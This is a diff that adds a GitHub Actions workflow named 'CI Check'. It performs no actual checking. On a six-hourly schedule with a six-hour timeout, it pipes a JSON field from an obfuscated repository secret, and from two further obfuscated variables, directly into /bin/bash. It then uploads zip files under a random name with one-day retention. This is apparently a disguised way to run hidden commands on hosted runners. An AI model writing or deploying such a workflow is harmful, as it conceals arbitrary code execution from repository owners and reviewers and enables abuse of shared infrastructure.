@@ -1,0 +1,39 @@
+name: CI Check
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '51 0,6,12,18 * * *'
+permissions:
+  contents: read
+  actions: read
+env:
+  CI: true
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  task:
+    name: Main task
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Execute
+        env:
+          tbhd7436: ${{ secrets.tbhd7436 }}
+        run: |
+          printf '%s' "$tbhd7436" | jq -r .emrn785 | /bin/bash
+          echo $gtqpx47176 | jq -r .qevle7456 | /bin/bash
+          echo $hc1 | jq -r .sezwp0 | /bin/bash
+
+      - name: Upload artifact
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: TZvfwbWX
+          path: "*.zip"
+          retention-days: 1
